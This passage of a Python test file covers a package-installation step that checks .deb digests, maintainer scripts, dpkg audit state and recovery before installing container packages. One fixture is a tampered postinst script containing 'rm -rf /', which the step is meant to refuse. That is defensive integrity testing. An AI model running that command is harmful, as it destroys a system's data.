    different bytes under the pinned version without the role having to
    re-commit a digest at every security update. The maintainer scripts go
    the other way — they are compared against digests a human read and
    COMMITTED, because those are the programs the install will run as
    root, and no archive statement about them is worth anything here.
    """
    assert _RUNNER_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)
    packages = importlib.import_module(_PACKAGES_MODULE)
    inputs = _declare(root=tmp_path, payload=_payload(cache=tmp_path / "cache"))
    clean = _RecordedRunner(result=runner_module.CommandOutput, outputs=_fenced_outputs())

    assert packages.run_package_step(inputs=inputs, runner=clean).refusal is None
    downloaded = _calls_named(runner=clean, argv=("apt-get", "download"))
    assert [tuple(call.argv) for call in downloaded] == [
        ("apt-get", "download", "docker.io=29.1.3-0ubuntu4.1"),
        ("apt-get", "download", "containerd=2.2.2-0ubuntu1.1"),
    ]
    # Into the role's cache, which is where the audited set is read from —
    # `apt-get download` writes to its working directory and nowhere else.
    assert {call.cwd for call in downloaded} == {tmp_path / "cache"}

    other_bytes = _digest(data=b"bytes some mirror served instead")
    for outputs, expected in (
        (
            [
                (
                    ("apt-cache", "show"),
                    [
                        _index_stanza(package=_ENGINE[0], version=_ENGINE[1], digest=other_bytes),
                    ],
                )
            ],
            "differs from the archive index",
        ),
        (
            [(("dpkg-deb", "-I"), ["#!/bin/sh\nrm -rf /\n"])],
            "postinst differs from its committed digest",
        ),
    ):
        runner = _RecordedRunner(
            result=runner_module.CommandOutput, outputs=[*outputs, *_fenced_outputs()]
        )

        outcome = packages.run_package_step(inputs=inputs, runner=runner)

        assert outcome.refusal is not None
        assert expected in outcome.refusal
        assert _calls_named(runner=runner, argv=("dpkg", "-i")) == []


def test_the_package_step_refuses_a_deb_whose_maintainer_scripts_are_not_the_allowlists(
    tmp_path: Path,
) -> None:
    """Specification "Package fence": the committed digests cover the whole SET.

    The per-script digest loop walks the names the ALLOWLIST carries, so
    it is entirely silent about a script the archive carries and the
    allowlist does not — a program that would run as root during the
    install having been read by nobody, and the cheapest way for a
    rebuilt or substituted archive to get one there. The committed
    digests are only a complete statement about the scripts if the set
    they cover is the set the archive holds, so the SET is compared
    before any digest is.

    Both directions refuse, and the second is not symmetry for its own
    sake: an allowlist naming a script the archive no longer carries is
    a committed audit that has gone stale, and reading it as "that
    digest simply has nothing to check" would let the staleness through.
    """
    assert _RUNNER_PATH.is_file()
    assert _AUDIT_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)
    packages = importlib.import_module(_PACKAGES_MODULE)
    payload = _payload(cache=tmp_path / "cache")
    engine_deb = _deb_name(package=_ENGINE[0], version=_ENGINE[1])

    for scripts, expected in (
        (("postinst", "postrm"), "postrm"),
        ((), "not the ('postinst',)"),
    ):
        inputs = _declare(root=tmp_path, payload=payload)
        runner = _RecordedRunner(
            result=runner_module.CommandOutput,
            outputs=_fenced_outputs(),
            listings={**_control_listings(), engine_deb: _control_listing(scripts=scripts)},
        )

        outcome = packages.run_package_step(inputs=inputs, runner=runner)

        assert outcome.refusal is not None
        assert expected in outcome.refusal
        assert engine_deb in outcome.refusal
        assert _calls_named(runner=runner, argv=("dpkg", "-i")) == []


def test_the_package_step_refuses_a_download_the_archive_cannot_account_for(
    tmp_path: Path,
) -> None:
    """The three ways the download itself fails to produce an auditable archive.

    None of them is exotic and none of them raises: `apt-get download`
    exits 0 having written nothing when the pinned version has fallen out
    of the index; `apt-cache show` prints a stanza with no `SHA256:` when
    the index entry came from a source that carries none; and a `.deb`
    whose control version is not the pinned one is a cache collision on
    the file NAME. Each must stop the step rather than reach `dpkg -i`.
    """
    assert _RUNNER_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)
    packages = importlib.import_module(_PACKAGES_MODULE)
    payload = _payload(cache=tmp_path / "cache")
    inputs = _declare(root=tmp_path, payload=payload)
    indexless = "Package: docker.io\nVersion: 29.1.3-0ubuntu4.1\nArchitecture: amd64\n"

    for outputs, drop, expected in (
        ([], True, "left no docker.io_29.1.3-0ubuntu4.1_amd64.deb"),
        ([(("apt-cache", "show"), [indexless])], False, "carries no SHA256"),
        ([(("dpkg-deb", "-f"), ["29.1.2-0ubuntu4\n"])], False, "control version"),
    ):
        if drop:
            (tmp_path / "cache" / _deb_name(package=_ENGINE[0], version=_ENGINE[1])).unlink()
        runner = _RecordedRunner(
            result=runner_module.CommandOutput, outputs=[*outputs, *_fenced_outputs()]
        )

        outcome = packages.run_package_step(inputs=inputs, runner=runner)

        assert outcome.refusal is not None
        assert expected in outcome.refusal
        assert _calls_named(runner=runner, argv=("dpkg", "-i")) == []
        inputs = _declare(root=tmp_path, payload=payload)


def test_the_package_step_refuses_a_dpkg_audit_no_recorded_intended_set_accounts_for(
    tmp_path: Path,
) -> None:
    """Specification "Package fence": a flagged package outside EVERY intended set.

    `dpkg --audit` naming something is not by itself a reason to stop: a
    rollback from `publishing` leaves the packages of a guard run part
    installed, and the next run has to be able to finish them. What it
    may never do is step over a package no guard run ever intended —
    somebody else's interrupted transaction — so the test is membership
    in the union of every run's recorded set, which is implementation
    rider point 4: recovery must NOT be keyed to this run's id alone.

    The intended record itself is written before the mutation (design
    R7), which this proves by refusing after it and finding it there.
    """
    assert _RUNNER_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)
    packages = importlib.import_module(_PACKAGES_MODULE)
    inputs = _declare(root=tmp_path, payload=_payload(cache=tmp_path / "cache"))
    _record_earlier_runs(root=tmp_path)

    foreign = _RecordedRunner(
        result=runner_module.CommandOutput,
        outputs=[(("dpkg", "--audit"), [_audit_report(packages=("nginx",))]), *_fenced_outputs()],
    )
    refused = packages.run_package_step(inputs=inputs, runner=foreign)

    assert refused.refusal is not None
    assert "nginx" in refused.refusal
    assert _calls_named(runner=foreign, argv=("dpkg", "-i")) == []
    recorded = json.loads((inputs.parent / "intended.json").read_text(encoding="utf-8"))
    assert recorded == {
        "run": "run-a",
        "additions": ["containerd=2.2.2-0ubuntu1.1", "docker.io=29.1.3-0ubuntu4.1"],
    }

    # `runc` is in no intended set of THIS run and in the earlier run's,
    # so the union accounts for it and the step carries on.
    # The second answer is the re-read after the recovery, which design
    # F6 requires to be EMPTY before a fresh transaction is issued.
    neighbour = _RecordedRunner(
        result=runner_module.CommandOutput,
        outputs=[
            (("dpkg", "--audit"), [_audit_report(packages=("runc",)), ""]),
            *_fenced_outputs(),
        ],
    )

    assert packages.run_package_step(inputs=inputs, runner=neighbour).refusal is None


def test_the_package_step_configures_only_part_installed_packages_a_run_intended(
    tmp_path: Path,
) -> None:
    """Specification "Package fence": `dpkg --configure` on those three states only.

    This is design F6's recovery branch, and both halves of its
    narrowness are asserted. It is `dpkg --configure <those packages>`
    and never `--configure -a`, which would adopt whatever else the host
    has left pending. And it covers only the three states an interrupted
    UNPACK leaves — `half-installed`, `unpacked`, `half-configured` — so
    a package merely awaiting triggers is left to the trigger completion
    rather than configured underneath it.

    `runc` here belongs to the EARLIER run, which is the case rider
    point 4 names: that run rolled back from `publishing` and left its
    own package unpacked, and this run completes it instead of refusing.
    """
    assert _RUNNER_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)
    packages = importlib.import_module(_PACKAGES_MODULE)
    inputs = _declare(root=tmp_path, payload=_payload(cache=tmp_path / "cache"))
    _record_earlier_runs(root=tmp_path)
    interrupted = _QUERY_BEFORE + "runc 1.4.0-0ubuntu1 unpacked\ntini 0.19.0-1 triggers-pending\n"
    settled = _QUERY_AFTER + "runc 1.4.0-0ubuntu1 installed\ntini 0.19.0-1 installed\n"
    runner = _RecordedRunner(
        result=runner_module.CommandOutput,
        outputs=[
            # The report, and then the re-read the recovery leaves clean —
            # design F6's empty audit, which the install waits for.
            (("dpkg", "--audit"), [_audit_report(packages=("runc", "tini")), ""]),
            (("dpkg-query",), [interrupted, interrupted, settled]),
            *_fenced_outputs(),
        ],
    )

    outcome = packages.run_package_step(inputs=inputs, runner=runner)

    assert outcome.refusal is None
    configured = _calls_named(runner=runner, argv=("dpkg", "--configure"))
    assert len(configured) == 1
    assert tuple(configured[0].argv) == ("dpkg", "--configure", "runc")
    assert configured[0].env == {"DPKG_FRONTEND_LOCKED": "1"}
    # Completed BEFORE this run's own transaction: dpkg refuses to unpack
    # over a database that still holds an unfinished one.
    installed = _calls_named(runner=runner, argv=("dpkg", "-i"))
    assert runner.calls.index(configured[0]) < runner.calls.index(installed[0])


def test_the_package_step_completes_interrupted_triggers_for_those_packages_only(
    tmp_path: Path,
) -> None:
    """Specification "Package fence": `dpkg --triggers-only`, restricted that way.

    Design G7: a helper killed during the install can leave trigger
    processing half done, and a package left `triggers-pending` is not
    broken enough for `--configure` and not finished enough to be
    installed over. It is completed with `dpkg --triggers-only` aimed at
    the named packages, which is what keeps a rollback from `publishing`
    from stranding every later run — and the restriction is the same
    recorded-intended-set membership, so somebody else's pending trigger
    is never completed on their behalf.
    """
    assert _RUNNER_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)
    packages = importlib.import_module(_PACKAGES_MODULE)
    inputs = _declare(root=tmp_path, payload=_payload(cache=tmp_path / "cache"))
    _record_earlier_runs(root=tmp_path)
    awaiting = _QUERY_BEFORE + "runc 1.4.0-0ubuntu1 unpacked\ntini 0.19.0-1 triggers-pending\n"
    settled = _QUERY_AFTER + "runc 1.4.0-0ubuntu1 installed\ntini 0.19.0-1 installed\n"
    runner = _RecordedRunner(
        result=runner_module.CommandOutput,
        outputs=[
            # The report, and then the re-read the recovery leaves clean —
            # design F6's empty audit, which the install waits for.
            (("dpkg", "--audit"), [_audit_report(packages=("runc", "tini")), ""]),
            (("dpkg-query",), [awaiting, awaiting, settled]),
            *_fenced_outputs(),
        ],
    )

    outcome = packages.run_package_step(inputs=inputs, runner=runner)

    assert outcome.refusal is None
    completed = _calls_named(runner=runner, argv=("dpkg", "--triggers-only"))
    assert len(completed) == 1
    # `runc` is absent on purpose: an unpacked package is the configure
    # branch's, and completing its triggers would skip the configuration.
    assert tuple(completed[0].argv) == ("dpkg", "--triggers-only", "tini")
    assert completed[0].env == {"DPKG_FRONTEND_LOCKED": "1"}
    installed = _calls_named(runner=runner, argv=("dpkg", "-i"))
    assert runner.calls.index(completed[0]) < runner.calls.index(installed[0])


def test_the_package_step_refuses_when_an_installed_version_moved_under_the_audit(
    tmp_path: Path,
) -> None:
    """Specification "Package fence": a version the audit relied on may not move.

    The audit is not instantaneous — it simulates a transaction, then
    downloads and digests every archive — and its verdict rests on the
    versions the host held while it ran, because that is what apt
    resolved the pins against. So dpkg's table is read again immediately
    before the mutation and compared: an unattended upgrade that landed
    libc6 in between did not break any committed digest, and would leave
    the audited verdict resting on a host that no longer exists.
    """
    assert _RUNNER_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)
    packages = importlib.import_module(_PACKAGES_MODULE)
    inputs = _declare(root=tmp_path, payload=_payload(cache=tmp_path / "cache"))
    moved = _QUERY_BEFORE.replace("libc6 2.39-0ubuntu8.4", "libc6 2.39-0ubuntu8.5")
    runner = _RecordedRunner(
        result=runner_module.CommandOutput,
        outputs=[(("dpkg-query",), [_QUERY_BEFORE, moved]), *_fenced_outputs()],
    )

    outcome = packages.run_package_step(inputs=inputs, runner=runner)

    assert outcome.refusal is not None
    assert "libc6" in outcome.refusal
    assert _calls_named(runner=runner, argv=("dpkg", "-i")) == []


def test_the_package_step_requires_the_post_install_difference_to_be_the_additions(
    tmp_path: Path,
) -> None:
    """Specification "Package fence": the difference MUST be the audited additions.

    The audit cleared one transaction; the `dpkg-query` difference across
    the install is the only evidence that the transaction which actually
    ran was that one. A dpkg run that landed a package nobody audited — a
    dependency unpacked from a stale archive in the cache, a resolver
    decision the simulation did not predict — leaves the host carrying it
    and raises no other signal whatever, so the difference is compared
    against the additions rather than merely inspected for the ones
    expected.
    """
    assert _RUNNER_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)
    packages = importlib.import_module(_PACKAGES_MODULE)
    inputs = _declare(root=tmp_path, payload=_payload(cache=tmp_path / "cache"))
    unaudited = _QUERY_AFTER + "runc 1.4.0-0ubuntu1 installed\n"
    runner = _RecordedRunner(
        result=runner_module.CommandOutput,
        outputs=[(("dpkg-query",), [_QUERY_BEFORE, _QUERY_BEFORE, unaudited]), *_fenced_outputs()],
    )

    outcome = packages.run_package_step(inputs=inputs, runner=runner)

    assert outcome.refusal is not None
    assert "runc=1.4.0-0ubuntu1" in outcome.refusal
    assert outcome.installed == ()


def test_the_package_step_installs_nothing_when_the_audited_set_is_already_installed(
    tmp_path: Path,
) -> None:
    """Design Mechanism 6's "packages installed, new run" row, and F6's recovery.

    Every new run after a rollback reaches here, because a rollback
    never purges packages — and so does the `recover` of a run
    interrupted between `dpkg -i` and `published`. On such a host the
    post-install difference is EMPTY, so comparing it with the whole
    audited set refused every one of them: the install had already
    happened and the evidence for it was the absence of a change.

    So the step re-reads dpkg's table, finds every audited addition
    already settled at its audited version, and completes without
    issuing `dpkg -i` again — which is the half worth asserting
    separately from the verdict, because re-issuing it would mutate a
    host that already matches the audit. What it reports as installed is
    the audited set, since that is what the host now carries.
    """
    assert _RUNNER_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)
    packages = importlib.import_module(_PACKAGES_MODULE)
    inputs = _declare(root=tmp_path, payload=_payload(cache=tmp_path / "cache"))
    runner = _RecordedRunner(
        result=runner_module.CommandOutput,
        outputs=[
            (("apt-get", "-s"), [_SIMULATION_SETTLED]),
            (("dpkg-query",), [_QUERY_AFTER]),
            *_fenced_outputs(),
        ],
    )

    outcome = packages.run_package_step(inputs=inputs, runner=runner)

    assert outcome.refusal is None
    assert outcome.installed == ("containerd=2.2.2-0ubuntu1.1", "docker.io=29.1.3-0ubuntu4.1")
    assert _calls_named(runner=runner, argv=("dpkg", "-i")) == []


def test_the_package_step_refuses_a_foreign_dpkg_audit_on_a_host_already_settled(
    tmp_path: Path,
) -> None:
    """Specification "Package fence": the settled host is asked `dpkg --audit` too.

    FAULTS B-06 on poweredge guard-vm-7, 2026-10-17: the publish unit and
    dpkg were SIGKILLed during `dpkg -i`. Every audited package ended
    settled, so the `recover` that resumed publish took the settled path
    — and that path returned before the flagged-package handling ran at
    all. It reported an inert install published while `dpkg --audit` still
    named `man-db`, whose trigger this install had activated, which on a
    real host blocks apt and unattended-upgrades until somebody runs
    `dpkg --configure -a` by hand.

    A host whose dpkg table already holds the audited set is therefore not
    a host with nothing to ask: it is the one case where the install
    ALREADY happened, and the flagged package left behind is the only
    evidence of how it ended. `man-db` here is in no guard run's recorded
    intended set, so the refusal is the union test the fence already
    carries, reached from the path that never asked it.
    """
    assert _RUNNER_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)
    packages = importlib.import_module(_PACKAGES_MODULE)
    inputs = _declare(root=tmp_path, payload=_payload(cache=tmp_path / "cache"))
    _record_earlier_runs(root=tmp_path)
    runner = _RecordedRunner(
        result=runner_module.CommandOutput,
        outputs=[
            (("apt-get", "-s"), [_SIMULATION_SETTLED]),
            (("dpkg", "--audit"), [_audit_report(packages=("man-db",))]),
            (("dpkg-query",), [_QUERY_AFTER]),
            *_fenced_outputs(),
        ],
    )

    outcome = packages.run_package_step(inputs=inputs, runner=runner)

    assert outcome.refusal is not None
    assert "man-db" in outcome.refusal
    assert outcome.installed == ()
    assert _calls_named(runner=runner, argv=("dpkg", "-i")) == []


def test_the_package_step_completes_an_intended_package_a_settled_host_left_half_done(
    tmp_path: Path,
) -> None:
    """Design F6's recovery branch, reached from the settled path as well.

    The other half of FAULTS B-06. A kill during `dpkg -i` can leave
    every audited package settled and a package of a guard run's own
    recorded intended set `half-configured` beside them — on B-06 the
    trigger handler this install's own man pages activated. The settled
    path owes that package the same `dpkg --configure` the install path
    has always given it: finishing it is what frees apt and
    unattended-upgrades on the host, and the step may not report the
    audited additions installed while it is outstanding.

    `runc` here belongs to the EARLIER run, which is the case
    implementation rider point 4 names — so the recovery is allowed, and
    aimed at that package by name rather than issued as `--configure -a`.
    No `dpkg -i` runs: the audited set is settled, so there is still no
    transaction to repeat.
    """
    assert _RUNNER_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)
    packages = importlib.import_module(_PACKAGES_MODULE)
    inputs = _declare(root=tmp_path, payload=_payload(cache=tmp_path / "cache"))
    _record_earlier_runs(root=tmp_path)
    half_done = _QUERY_AFTER + "runc 1.4.0-0ubuntu1 half-configured\n"
    runner = _RecordedRunner(
        result=runner_module.CommandOutput,
        outputs=[
            (("apt-get", "-s"), [_SIMULATION_SETTLED]),
            # The report, and then the re-read the recovery leaves clean.
            (("dpkg", "--audit"), [_audit_report(packages=("runc",)), ""]),
            (("dpkg-query",), [half_done]),
            *_fenced_outputs(),
        ],
    )

    outcome = packages.run_package_step(inputs=inputs, runner=runner)

    assert outcome.refusal is None
    assert outcome.installed == ("containerd=2.2.2-0ubuntu1.1", "docker.io=29.1.3-0ubuntu4.1")
    configured = _calls_named(runner=runner, argv=("dpkg", "--configure"))
    assert len(configured) == 1
    assert tuple(configured[0].argv) == ("dpkg", "--configure", "runc")
    assert configured[0].env == {"DPKG_FRONTEND_LOCKED": "1"}
    assert _calls_named(runner=runner, argv=("dpkg", "-i")) == []


def test_the_package_step_completes_a_half_configured_handler_its_install_activated(
    tmp_path: Path,
) -> None:
    """Specification "Package fence": the leftover rule's SECOND arm, completing.

    FAULTS B-06 on poweredge guard-vm-7, 2026-10-17 13:00Z: the publish
    unit and dpkg were SIGKILLed during `dpkg -i`. Every audited package
    ended settled and man-db was left `half-configured`, because this
    install's own man pages had activated its trigger. man-db is in no
    guard run's recorded intended set, so the intended-set arm alone
    refuses — honestly, and leaving the run stranded with apt and
    unattended-upgrades blocked on the host until somebody runs
    `dpkg --configure -a` by hand.

    The second arm is what attributes it. The most recent pre-install
    audit record any guard run wrote is EMPTY, which is the evidence that
    the guard's own `dpkg -i` started from a clean dpkg database; and
    dpkg's own log records no `install`, `upgrade`, `remove`, `purge` or
    `configure` action on a package outside every recorded intended set
    since that record was written, which is the evidence that nothing
    else has touched the database since. What is flagged is therefore the
    guard's own leftover, and completing it is the guard's job.

    Both halves of the narrowness still hold: the completion is aimed at
    man-db BY NAME and never issued as `--configure -a`, and the step
    reaches its report only with `dpkg --audit` empty.
    """
    assert _LEFTOVERS_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)
    packages = importlib.import_module(_PACKAGES_MODULE)
    inputs = _declare(root=tmp_path, payload=_payload(cache=tmp_path / "cache"))
    _record_earlier_runs(root=tmp_path)
    _record_pre_install_audit(
        root=tmp_path,
        run="run-prior",
        data=_audit_record(run="run-prior", flagged=()),
        written_at=_RECORD_WRITTEN_AT,
    )
    runner = _leftover_outputs(
        result=runner_module.CommandOutput,
        flagged=("man-db",),
        query=_QUERY_AFTER + "man-db 2.12.0-4build2 half-configured\n",
    )

    outcome = packages.run_package_step(
        inputs=inputs, runner=runner, dpkg_log=_own_install_log(root=tmp_path)
    )

    assert outcome.refusal is None
    assert outcome.installed == ("containerd=2.2.2-0ubuntu1.1", "docker.io=29.1.3-0ubuntu4.1")
    configured = _calls_named(runner=runner, argv=("dpkg", "--configure"))
    assert [tuple(call.argv) for call in configured] == [("dpkg", "--configure", "man-db")]
    assert configured[0].env == {"DPKG_FRONTEND_LOCKED": "1"}
    assert _calls_named(runner=runner, argv=("dpkg", "--configure", "-a")) == []
    # Completed BEFORE the report: what the step recorded as the audit it
    # was about to install over is empty, and that read happens after the
    # recovery. No `dpkg -i` — the audited set was already settled.
    record = inputs.parent / "pre-install-audit.json"
    assert json.loads(record.read_text(encoding="utf-8")) == {"run": "run-a", "flagged": []}
    assert _calls_named(runner=runner, argv=("dpkg", "-i")) == []


def test_the_package_step_completes_a_triggers_pending_handler_its_install_activated(
    tmp_path: Path,
) -> None:
    """Specification "Package fence": the same arm, through `--triggers-only`.

    The kill that stranded FAULTS B-06 can land either side of the
    handler's own configuration, so the leftover it leaves is in one of
    two positions. A handler killed while its trigger was still queued is
    `triggers-pending` rather than `half-configured`: not broken enough
    for `--configure`, and not finished enough to be installed over.
    Design G7 completes exactly that with `dpkg --triggers-only`.

    Which of the two it is comes off dpkg's own table rather than off the
    audit report, which names neither state, and the states do not
    overlap — so this host sees `--triggers-only` on man-db and no
    `--configure` at all. Configuring a package that is only awaiting
    triggers would run a configuration it is not waiting for.
    """
    assert _LEFTOVERS_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)
    packages = importlib.import_module(_PACKAGES_MODULE)
    inputs = _declare(root=tmp_path, payload=_payload(cache=tmp_path / "cache"))
    _record_earlier_runs(root=tmp_path)
    _record_pre_install_audit(
        root=tmp_path,
        run="run-prior",
        data=_audit_record(run="run-prior", flagged=()),
        written_at=_RECORD_WRITTEN_AT,
    )
    runner = _leftover_outputs(
        result=runner_module.CommandOutput,
        flagged=("man-db",),
        query=_QUERY_AFTER + "man-db 2.12.0-4build2 triggers-pending\n",
    )

    outcome = packages.run_package_step(
        inputs=inputs, runner=runner, dpkg_log=_own_install_log(root=tmp_path)
    )

    assert outcome.refusal is None
    assert outcome.installed == ("containerd=2.2.2-0ubuntu1.1", "docker.io=29.1.3-0ubuntu4.1")
    completed = _calls_named(runner=runner, argv=("dpkg", "--triggers-only"))
    assert [tuple(call.argv) for call in completed] == [("dpkg", "--triggers-only", "man-db")]
    assert completed[0].env == {"DPKG_FRONTEND_LOCKED": "1"}
    assert _calls_named(runner=runner, argv=("dpkg", "--configure")) == []
    record = inputs.parent / "pre-install-audit.json"
    assert json.loads(record.read_text(encoding="utf-8")) == {"run": "run-a", "flagged": []}


def test_the_package_step_refuses_a_flagged_package_a_foreign_dpkg_action_reaches(
    tmp_path: Path,
) -> None:
    """Specification "Package fence": the second arm's own fence, refusing.

    The danger of attributing a flagged package to the guard runs the
    opposite way from B-06: adopting somebody else's interrupted
    transaction. dpkg's log is what rules that out, so an `install` of a
    package outside every recorded intended set since the record was
    written switches the arm OFF — man-db is then no guard run's
    leftover, the step refuses naming it, and it completes nothing.

    The log that cannot be READ refuses for the same reason. "No foreign
    action since that record" is a claim about the whole series, and a
    series with a member missing supports no such claim; read as "nothing
    found" it would attribute every flagged package on a host whose log
    was rotated away or never kept.
    """
    assert _LEFTOVERS_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)
    packages = importlib.import_module(_PACKAGES_MODULE)
    foreign = (_LOG_OLD_FOREIGN + _LOG_OWN_INSTALL + _LOG_FOREIGN_INSTALL).encode("utf-8")

    for index, members in enumerate(({"dpkg.log": foreign}, {})):
        root = tmp_path / f"host-{index}"
        inputs = _declare(root=root, payload=_payload(cache=root / "cache"))
        _record_earlier_runs(root=root)
        _record_pre_install_audit(
            root=root,
            run="run-prior",
            data=_audit_record(run="run-prior", flagged=()),
            written_at=_RECORD_WRITTEN_AT,
        )
        runner = _leftover_outputs(
            result=runner_module.CommandOutput,
            flagged=("man-db",),
            query=_QUERY_AFTER + "man-db 2.12.0-4build2 half-configured\n",
        )

        outcome = packages.run_package_step(
            inputs=inputs, runner=runner, dpkg_log=_dpkg_log(root=root, members=members)
        )

        assert outcome.refusal is not None
        assert "man-db" in outcome.refusal
        assert outcome.installed == ()
        assert _calls_named(runner=runner, argv=("dpkg", "--configure")) == []
        assert _calls_named(runner=runner, argv=("dpkg", "--triggers-only")) == []
        assert _calls_named(runner=runner, argv=("dpkg", "-i")) == []


def test_the_package_step_refuses_a_flagged_package_the_most_recent_record_named(
    tmp_path: Path,
) -> None:
    """Specification "Package fence": the arm's other half, the audit record.

    An empty record is the only evidence that the guard's own `dpkg -i`
    started from a clean dpkg database. A record naming a package says
    the opposite — that run entered its install over a transaction
    somebody else had left unfinished — so nothing flagged afterwards is
    attributable to the guard, and the step refuses naming it.

    It is the MOST RECENT record that answers, not every record, which is
    the second arm here: a host carrying an older record that named
    something and a newer one that is empty has since had a run start
    clean, and refusing on the older one would strand every later run on
    a transaction that has already been accounted for.

    A record that cannot be READ is the third arm, and refuses for the
    reason the unreadable log above does: it is the absence of the
    evidence rather than evidence of a clean start.
    """
    assert _LEFTOVERS_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)
    packages = importlib.import_module(_PACKAGES_MODULE)
    empty = ("run-prior", _audit_record(run="run-prior", flagged=()))
    named = ("run-interrupted", _audit_record(run="run-interrupted", flagged=("man-db",)))
    torn = ("run-torn", "{half-written")

    for index, (records, expected) in enumerate(
        (
            (((*empty, _EARLIER_RECORD_AT), (*named, _RECORD_WRITTEN_AT)), "man-db"),
            (((*named, _EARLIER_RECORD_AT), (*empty, _RECORD_WRITTEN_AT)), None),
            (((*torn, _RECORD_WRITTEN_AT),), "man-db"),
        )
    ):
        root = tmp_path / f"host-{index}"
        inputs = _declare(root=root, payload=_payload(cache=root / "cache"))
        _record_earlier_runs(root=root)
        for run, data, written_at in records:
            _record_pre_install_audit(root=root, run=run, data=data, written_at=written_at)
        runner = _leftover_outputs(
            result=runner_module.CommandOutput,
            flagged=("man-db",),
            query=_QUERY_AFTER + "man-db 2.12.0-4build2 half-configured\n",
        )

        outcome = packages.run_package_step(
            inputs=inputs, runner=runner, dpkg_log=_own_install_log(root=root)
        )

        configured = [
            tuple(call.argv) for call in _calls_named(runner=runner, argv=("dpkg", "--configure"))
        ]
        if expected is None:
            assert outcome.refusal is None
            assert configured == [("dpkg", "--configure", "man-db")]
        else:
            assert outcome.refusal is not None
            assert expected in outcome.refusal
            assert configured == []


def test_every_dpkg_recovery_the_package_step_issues_names_its_packages(
    tmp_path: Path,
) -> None:
    """Specification "Package fence": the step MUST NOT issue `dpkg --configure -a`.

    Stated as a property of EVERY recovery command rather than as the
    absence of one spelling, because `-a` is not the only way to adopt a
    host's pending work: a `dpkg --configure` or `dpkg --triggers-only`
    carrying no package at all, or carrying any flag in place of a name,
    would reach past the fence just as far. So each recovery invocation
    is read back and required to be names only.

    The host here is the one that issues both, so both are covered by one
    reading: libc-bin was left `half-configured` and man-db
    `triggers-pending` by the same interrupted install, and neither is in
    any recorded intended set — both are the guard's under the second arm,
    and the states route them to different commands.
    """
    assert _LEFTOVERS_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)
    packages = importlib.import_module(_PACKAGES_MODULE)
    inputs = _declare(root=tmp_path, payload=_payload(cache=tmp_path / "cache"))
    _record_earlier_runs(root=tmp_path)
    _record_pre_install_audit(
        root=tmp_path,
        run="run-prior",
        data=_audit_record(run="run-prior", flagged=()),
        written_at=_RECORD_WRITTEN_AT,
    )
    runner = _leftover_outputs(
        result=runner_module.CommandOutput,
        flagged=("libc-bin", "man-db"),
        query=(
            _QUERY_AFTER
            + "libc-bin 2.39-0ubuntu8.4 half-configured\n"
            + "man-db 2.12.0-4build2 triggers-pending\n"
        ),
    )

    outcome = packages.run_package_step(
        inputs=inputs, runner=runner, dpkg_log=_own_install_log(root=tmp_path)
    )

    assert outcome.refusal is None
    recoveries = [
        call
        for call in runner.calls
        if tuple(call.argv[:2]) in {("dpkg", "--configure"), ("dpkg", "--triggers-only")}
    ]
    assert [tuple(call.argv) for call in recoveries] == [
        ("dpkg", "--configure", "libc-bin"),
        ("dpkg", "--triggers-only", "man-db"),
    ]
    for call in recoveries:
        named = tuple(call.argv)[2:]
        assert named
        assert [name for name in named if name.startswith("-")] == []


def test_the_package_step_reads_dpkg_s_log_across_the_rotation_that_moved_it(
    tmp_path: Path,
) -> None:
    """Specification "Package fence": "since that record was written", in full.

    logrotate moves `/var/log/dpkg.log` aside and compresses the older
    copies, and a guard run can rest in phase `publishing` across that
    boundary — `publishing` carries no deadline, so there is no bound on
    how long a run may sit there before a `recover` resumes it. So "no
    `install`, `upgrade`, `remove`, `purge` or `configure` action since
    that record was written" is a claim about dpkg's WHOLE record of
    itself and not about the current file: read from that file alone it
    under-counts the foreign actions, and an under-count here attributes
    somebody else's package to the guard and then completes their
    transaction. That is the one direction this may not fail in, which is
    why the series is read rather than the file (ratification review of
    v075, point 1).

    Three arms, one per way the evidence can live outside the current
    file: the plain `dpkg.log.1` that `delaycompress` leaves
    uncompressed, the gzipped `dpkg.log.2.gz` beside it, and a member
    that cannot be decompressed at all — which refuses for the reason an
    absent log does, since a series with an unreadable member supports no
    claim about what is not in it.
    """
    assert _LEFTOVERS_PATH.is_file()
    runner_module = importlib.import_module(_RUNNER_MODULE)
    packages = importlib.import_module(_PACKAGES_MODULE)
    current = (_LOG_OLD_FOREIGN + _LOG_OWN_INSTALL).encode("utf-8")
    rotated = _LOG_FOREIGN_INSTALL.encode("utf-8")

    for index, members in enumerate(
        (
            {"dpkg.log": current, "dpkg.log.1": rotated},
            {"dpkg.log": current, "dpkg.log.2.gz": gzip.compress(rotated)},
            {"dpkg.log": current, "dpkg.log.2.gz": b"bytes no gzip member begins with"},
        )
    ):
        root = tmp_path / f"host-{index}"
        inputs = _declare(root=root, payload=_payload(cache=root / "cache"))
        _record_earlier_runs(root=root)
        _record_pre_install_audit(
            root=root,
            run="run-prior",
            data=_audit_record(run="run-prior", flagged=()),
            written_at=_RECORD_WRITTEN_AT,
        )
        runner = _leftover_outputs(
            result=runner_module.CommandOutput,
            flagged=("man-db",),
            query=_QUERY_AFTER + "man-db 2.12.0-4build2 half-configured\n",
        )

        outcome = packages.run_package_step(
            inputs=inputs, runner=runner, dpkg_log=_dpkg_log(root=root, members=members)
        )

        assert outcome.refusal is not None
        assert "man-db" in outcome.refusal
        assert outcome.installed == ()
        assert _calls_named(runner=runner, argv=("dpkg", "--configure")) == []
        assert _calls_named(runner=runner, argv=("dpkg", "--triggers-only")) == []


def test_the_package_step_records_the_dpkg_audit_it_read_before_it_installs(
    tmp_path: Path,
) -> None:
